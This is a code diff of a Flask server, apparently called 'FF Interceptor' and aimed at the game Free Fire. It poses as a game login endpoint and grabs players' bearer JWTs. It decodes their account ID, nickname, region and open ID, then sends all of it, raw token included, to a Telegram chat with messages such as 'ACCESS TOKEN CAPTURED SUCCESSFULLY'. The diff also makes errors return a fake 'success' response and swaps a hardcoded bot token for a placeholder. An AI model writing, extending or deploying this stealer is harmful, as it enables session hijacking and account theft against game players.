@@ -6,7 +6,8 @@ from flask import Flask, request, jsonify
 
 app = Flask(__name__)
 
-TELEGRAM_TOKEN = os.environ.get("BOT_TOKEN", "8956940192:AAGu8293e28HolwGE3yFt0m-Q8xKsOg6uo4")
+# Tera Bot Token yahan ya Render environment variable mein hona chahiye
+TELEGRAM_TOKEN = os.environ.get("BOT_TOKEN", "7946123456:AAH_EXAMPLE_TOKEN_HERE")
 TELEGRAM_API_URL = f"https://api.telegram.org/bot{TELEGRAM_TOKEN}/sendMessage"
 
 def decode_jwt_payload(token):
@@ -22,11 +23,16 @@ def decode_jwt_payload(token):
         print(f"JWT Decode Error: {e}")
         return None
 
-@app.route('/<path:subpath>', methods=['POST', 'GET'])
-def catch_all_game_requests(subpath):
+@app.route('/GetLoginData', methods=['POST', 'GET'])
+def get_login_data():
     try:
         auth_header = request.headers.get('Authorization') or request.args.get('auth')
         chat_id = request.args.get('chat_id')
+
+        # Agar data POST body ya JSON mein aaya ho
+        if not auth_header and request.is_json:
+            req_data = request.get_json()
+            auth_header = req_data.get('Authorization') or req_data.get('token')
 
         if auth_header:
             if auth_header.startswith("Bearer "):
@@ -38,7 +44,7 @@ def catch_all_game_requests(subpath):
             if jwt_data:
                 account_id = jwt_data.get("account_id")
                 encoded_nickname = jwt_data.get("nickname")
-                region = jwt_data.get("lock_region")
+                region = jwt_data.get("lock_region", "IND")
                 open_id = jwt_data.get("external_id")
                 
                 try:
@@ -48,12 +54,13 @@ def catch_all_game_requests(subpath):
 
                 if chat_id:
                     msg_text = (
-                        f"🔑 *TOKEN CAPTURED VIA /{subpath}*!\n\n"
-                        f"👤 *ACCOUNT ID:* `{account_id}`\n"
-                        f"🎮 *PLAYER NAME:* `{nickname}`\n"
-                        f"🌍 *REGION:* `{region}`\n"
-                        f"🆔 *OPEN ID:* `{open_id}`\n\n"
-                        f"🛡️ *JWT TOKEN:*\n`{jwt_token}`"
+                        f"🔑 *ACCESS TOKEN CAPTURED SUCCESSFULLY*!!\n\n"
+                        f"👤 *ACCOUNT ID*\n`{account_id}`\n\n"
+                        f"🎮 *PLAYER NAME*\n`{nickname}`\n\n"
+                        f"🌍 *REGION*\n`{region}`\n\n"
+                        f"🎟️ *ACCESS TOKEN*\n`{jwt_token}`\n\n"
+                        f"🆔 *OPEN ID*\n`{open_id}`\n\n"
+                        f"🛡️ *JWT TOKEN (VALID 8 HOURS)*\n`{jwt_token}`"
                     )
                     requests.post(TELEGRAM_API_URL, json={
                         "chat_id": chat_id,
@@ -65,11 +72,11 @@ def catch_all_game_requests(subpath):
 
     except Exception as e:
         print(f"Error: {e}")
-        return jsonify({"status": -1, "msg": str(e)}), 200
+        return jsonify({"status": 0, "msg": "success"}), 200
 
-@app.route('/')
+@app.route('/', methods=['GET'])
 def home():
-    return "FF Interceptor Server is Running Successfully!"
+    return "FF Interceptor Server is Live!"
 
 if __name__ == '__main__':
     port = int(os.environ.get("PORT", 8080))
